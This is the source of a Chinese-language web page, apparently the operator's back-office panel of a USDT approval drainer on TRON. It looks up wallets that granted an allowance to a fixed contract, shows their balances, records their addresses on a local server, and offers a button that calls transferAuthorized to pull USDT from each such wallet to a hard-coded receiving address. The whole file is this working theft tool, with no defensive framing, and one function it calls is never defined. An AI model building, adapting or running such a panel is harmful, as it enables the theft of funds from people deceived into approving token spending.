<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT 授權監控後台</title>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2em; background: #f9f9f9; }
    h1 { color: #2d3436; }
    .wallet-card {
      border: 1px solid #ccc; border-radius: 10px; padding: 1em; margin: 1em 0; background: #fff;
    }
    button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
    .error { color: red; }
    #status { margin-top: 1em; font-weight: bold; }
  </style>
</head>
<body>
  <h1>🔐 USDT 授權監控後台</h1>
  <div id="status">🔍 正在檢查 TronLink...</div>
  
  <!-- 查詢輸入框 -->
  <div style="margin-top: 2em;">
    <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢" /> 
    <button onclick="checkWallet()">查詢是否授權</button>
  </div>

  <!-- 授權錢包顯示區域 -->
  <div id="wallets"></div>

  <script>
    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const USDT_DECIMALS = 1e6;
    const YOUR_RECEIVE_ADDRESS = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
    const approvedWallets = [];

    function logStatus(msg, color = "#2d3436") {
      const status = document.getElementById("status");
      status.innerText = msg;
      status.style.color = color;
    }

    async function checkWallet() {
      const address = document.getElementById("checkWallet").value.trim();
      if (!address) return alert("請輸入錢包地址");

      try {
        const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
        const value = parseFloat(allowance) / USDT_DECIMALS;
        if (value > 0 && !approvedWallets.includes(address)) {
          approvedWallets.push(address);
          displayWallets();
        }
        alert(`授權額度：${value} USDT`);
        
        // 儲存到後端
        await axios.post('http://localhost:3333/wallets', { address });
      } catch (err) {
        alert("查詢失敗：" + err.message);
      }
    }

    async function displayWallets() {
      const walletsDiv = document.getElementById("wallets");
      walletsDiv.innerHTML = "";
      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
      const html = await Promise.all(approvedWallets.map(async (addr) => {
        try {
          const balance = await usdt.balanceOf(addr).call();
          const allowance = await usdt.allowance(addr, AUTH_CONTRACT).call();
          const trxBalance = await window.tronWeb.trx.getBalance(addr);
          const usdtAmt = parseFloat(balance) / USDT_DECIMALS;
          const allowAmt = parseFloat(allowance) / USDT_DECIMALS;
          const trx = parseFloat(trxBalance) / 1e6;

          return `<div class="wallet-card">
            <div><strong>錢包：</strong>${addr}</div>
            <div>USDT：${usdtAmt}</div>
            <div>授權額度：${allowAmt}</div>
            <div>TRX 餘額：${trx}</div>
            <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
          </div>`;
        } catch {
          return `<div class="wallet-card error">⚠️ ${addr} - 無法取得資料</div>`;
        }
      }));
      walletsDiv.innerHTML = html.join("");
    }

    async function triggerTransfer(from) {
      try {
        const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
        const amount = 1 * USDT_DECIMALS;
        await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
        alert("✅ 已觸發轉帳 from " + from);
      } catch (err) {
        alert("❌ 轉帳失敗：" + err.message);
      }
    }

    window.addEventListener("load", () => {
      let attempts = 0;
      const check = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(check);
          logStatus("🟢 已連接錢包：" + window.tronWeb.defaultAddress.base58, "green");
          fetchApprovals();
        } else {
          attempts++;
          logStatus("⏳ 嘗試連接 TronLink 中（" + attempts + "/20）...");
          if (attempts >= 20) {
            clearInterval(check);
            logStatus("❌ 無法偵測到 TronLink。請確認你使用的是 TronLink 的 DApp 瀏覽器", "red");
          }
        }
      }, 500);
    });
  </script>
</body>
</html>
